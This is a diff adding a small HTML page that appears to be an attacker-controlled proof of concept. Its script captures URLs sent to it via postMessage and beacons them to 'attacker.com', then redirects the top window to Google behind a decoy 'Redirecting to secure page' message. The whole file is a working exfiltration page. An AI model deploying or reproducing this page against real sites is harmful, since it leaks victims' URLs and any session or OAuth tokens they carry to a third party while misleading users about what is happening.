@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+// Capture leaked URL first
+window.addEventListener('message', function(e) {
+    if (e.data && e.data.href) {
+        new Image().src = 'https://attacker.com/r?url=' + encodeURIComponent(e.data.href);
+    }
+});
+
+// Redirect after 1 second
+setTimeout(function() {
+    window.top.location.href = "https://google.com";
+}, 1000);
+</script>
+</head>
+<body style="font-family:Arial;padding:40px;text-align:center">
+<h2>🔄 Redirecting to secure page...</h2>
+<p>Please wait...</p>
+</body>
+</html>
